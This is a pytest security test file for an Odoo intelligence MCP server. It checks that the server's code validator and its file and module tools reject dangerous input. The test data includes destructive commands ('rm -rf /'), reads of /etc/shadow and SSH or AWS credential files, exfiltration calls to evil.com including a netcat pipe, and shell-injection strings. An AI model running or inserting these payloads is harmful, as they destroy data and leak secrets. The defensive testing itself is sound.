import os
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from odoo_intelligence_mcp.tools.code.execute_code import execute_code
from odoo_intelligence_mcp.tools.code.read_odoo_file import read_odoo_file
from odoo_intelligence_mcp.tools.operations.module_update import odoo_update_module
from odoo_intelligence_mcp.utils.security_utils import CodeSecurityValidator


class TestCodeInjectionPrevention:
    @pytest.mark.asyncio
    async def test_prevent_os_system_execution(self) -> None:
        dangerous_code = [
            "import os; os.system('rm -rf /')",
            "__import__('os').system('cat /etc/passwd')",
            'eval(\'__import__("os").system("ls")\')',
            'exec(\'import subprocess; subprocess.call(["rm", "-rf", "/"])\')',
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False
            assert "security" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_prevent_file_system_access(self) -> None:
        dangerous_code = [
            "open('/etc/passwd', 'r').read()",
            "with open('../../../../../../etc/passwd') as f: data = f.read()",
            "import shutil; shutil.rmtree('/')",
            "__builtins__['open']('/etc/shadow')",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False

    @pytest.mark.asyncio
    async def test_prevent_network_access(self) -> None:
        dangerous_code = [
            "import socket; s = socket.socket(); s.connect(('evil.com', 1337))",
            "import urllib.request; urllib.request.urlopen('http://evil.com/steal')",
            "import requests; requests.post('http://evil.com', data={'stolen': env})",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False or "import" in result.get("warning", "")

    @pytest.mark.asyncio
    async def test_allow_safe_odoo_operations(self) -> None:
        safe_code = [
            "result = env['res.partner'].search([('is_company', '=', True)])",
            "partner = env['res.partner'].create({'name': 'Test'})",
            "env.cr.execute('SELECT id, name FROM res_partner LIMIT 10')",
            "result = env['product.template'].search_count([])",
        ]

        validator = CodeSecurityValidator()
        for code in safe_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is True


class TestPathTraversalPrevention:
    @pytest.mark.asyncio
    async def test_prevent_path_traversal_in_read(self) -> None:
        dangerous_paths = [
            "../../../../../../etc/passwd",
            "/etc/passwd",
            "../../../.env",
            "~/.ssh/id_rsa",
            "${HOME}/.aws/credentials",
        ]

        for path in dangerous_paths:
            with patch("odoo_intelligence_mcp.tools.code.read_odoo_file.DockerClientManager") as mock_docker:
                mock_manager = MagicMock()
                mock_manager.get_container.return_value = {"success": True}
                mock_manager.exec_run.return_value = {
                    "success": False,
                    "stdout": "",
                    "stderr": "File not found",
                    "exit_code": 1
                }
                mock_docker.return_value = mock_manager

                result = await read_odoo_file(path)
                assert "error" in result or "not found" in result.get("error", "").lower()

    @pytest.mark.asyncio
    async def test_restrict_file_access_to_odoo_paths(self) -> None:
        allowed_paths = [
            "sale/models/sale_order.py",
            "addons/product/views/product_views.xml",
            "/odoo/addons/account/models/account_move.py",
        ]

        for path in allowed_paths:
            with patch("odoo_intelligence_mcp.tools.code.read_odoo_file.DockerClientManager") as mock_docker:
                mock_manager = MagicMock()
                mock_manager.get_container.return_value = {"success": True}
                # First exec_run call will be for checking if file exists
                # Second will be for reading the file
                mock_manager.exec_run.side_effect = [
                    {"success": True, "exit_code": 0, "stdout": "", "stderr": ""},  # test -f succeeds
                    {"success": True, "stdout": "file content", "stderr": "", "exit_code": 0}  # cat succeeds
                ]
                mock_docker.return_value = mock_manager

                result = await read_odoo_file(path)
                assert "content" in result or "success" in result


class TestCommandInjectionPrevention:
    # noinspection PyUnusedLocal
    @pytest.mark.asyncio
    async def test_prevent_command_injection_in_module_ops(self) -> None:
        dangerous_inputs = [
            "sale; rm -rf /",
            "sale && cat /etc/passwd",
            "sale | nc evil.com 1337",
            "sale`whoami`",
            "sale$(id)",
        ]

        for dangerous_input in dangerous_inputs:
            with patch("subprocess.run") as mock_run:
                # Mock successful container check and module update
                mock_run.side_effect = [
                    MagicMock(returncode=0, stdout="running", stderr=""),  # docker inspect
                    MagicMock(returncode=0, stdout="Module updated", stderr=""),  # docker exec
                ]

                result = await odoo_update_module(dangerous_input)

                # Check that subprocess.run was called for the module update
                if mock_run.call_count >= 2:
                    # Get the docker exec call (second call)
                    exec_call = mock_run.call_args_list[1]
                    cmd = exec_call[0][0]  # First positional argument is the command list
                    
                    # The module name should be sanitized - only the safe part should be used
                    # Check that the dangerous part was stripped
                    safe_module = dangerous_input.split(";")[0].split("&&")[0].split("|")[0].split("`")[0].split("$(")[0].strip()
                    # The command should contain the safe module name
                    cmd_str = " ".join(cmd) if isinstance(cmd, list) else str(cmd)
                    assert safe_module in cmd_str
                    # But not the dangerous parts
                    if ";" in dangerous_input:
                        assert "; rm" not in cmd_str
                    if "&&" in dangerous_input:
                        assert "&& cat" not in cmd_str

    @pytest.mark.asyncio
    async def test_sanitize_container_names(self) -> None:
        dangerous_names = [
            "odoo; docker run -it --rm alpine",
            "odoo && docker exec -it postgres psql",
            "odoo | tee /tmp/leak",
        ]

        for name in dangerous_names:
            with patch.dict(os.environ, {"ODOO_PROJECT_NAME": name}):
                from odoo_intelligence_mcp.core.env import HostOdooEnvironment, load_env_config

                config = load_env_config()
                env = HostOdooEnvironment(name, "odoo", "/test", config.db_host, config.db_port)
                # Check the container_name which should be sanitized
                assert ";" not in env.container_name
                assert "&&" not in env.container_name
                assert "|" not in env.container_name


class TestPrivilegeEscalationPrevention:
    @pytest.mark.asyncio
    async def test_prevent_sudo_usage(self) -> None:
        dangerous_code = [
            "import subprocess; subprocess.run(['sudo', 'cat', '/etc/shadow'])",
            "os.system('sudo rm -rf /')",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False

    @pytest.mark.asyncio
    async def test_prevent_user_switching(self) -> None:
        dangerous_code = [
            "os.setuid(0)",
            "os.setgid(0)",
            "os.seteuid(0)",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            assert result["is_valid"] is False or "warning" in result


class TestDataExfiltrationPrevention:
    @pytest.mark.asyncio
    async def test_prevent_environment_variable_access(self) -> None:
        dangerous_code = [
            "import os; secrets = os.environ",
            "password = os.getenv('DB_PASSWORD')",
            "api_key = os.environ['API_KEY']",
        ]

        validator = CodeSecurityValidator()
        for code in dangerous_code:
            result = validator.validate_code(code)
            if "os.environ" in code or "os.getenv" in code:
                assert result["is_valid"] is False or "warning" in result

    @pytest.mark.asyncio
    async def test_prevent_sensitive_file_access(self) -> None:
        sensitive_files = [
            ".env",
            "config.ini",
            "odoo.conf",
            ".git/config",
            "docker-compose.yml",
        ]

        for file_path in sensitive_files:
            with patch("odoo_intelligence_mcp.tools.code.read_odoo_file.DockerClientManager") as mock_docker:
                mock_manager = MagicMock()
                mock_container = MagicMock()
                mock_container.exec_run.return_value = (1, b"File not found")
                mock_manager.get_container.return_value = mock_container
                mock_docker.return_value = mock_manager

                result = await read_odoo_file(file_path)
                assert "error" in result or "not allowed" in str(result).lower()


class TestRateLimitingAndDoS:
    @pytest.mark.asyncio
    async def test_limit_concurrent_executions(self) -> None:
        import asyncio

        mock_env = AsyncMock()
        call_count = 0

        async def delayed_response(code: str) -> dict[str, str]:
            nonlocal call_count
            call_count += 1
            await asyncio.sleep(0.01)  # Small delay to simulate processing
            return {"result": "done", "code": code}

        mock_env.execute_code = delayed_response

        # Create a reasonable number of concurrent tasks
        tasks = [execute_code(mock_env, f"result = {i}") for i in range(10)]

        start_time = asyncio.get_event_loop().time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = asyncio.get_event_loop().time() - start_time

        # All tasks should complete successfully
        assert call_count == 10
        # If truly concurrent, should take much less than 0.1s (10 * 0.01s sequential)
        assert elapsed < 0.1
        errors = [r for r in results if isinstance(r, Exception)]
        assert len(errors) == 0

    @pytest.mark.asyncio
    async def test_prevent_infinite_loops(self) -> None:
        dangerous_code = [
            "while True: pass",
            "for i in iter(int, 1): pass",
            "[i for i in range(10**10)]",
        ]

        mock_env = AsyncMock()
        mock_env.execute_code = AsyncMock(side_effect=TimeoutError("Execution timeout"))

        for code in dangerous_code:
            result = await execute_code(mock_env, code)
            assert "error" in result or "timeout" in str(result).lower()
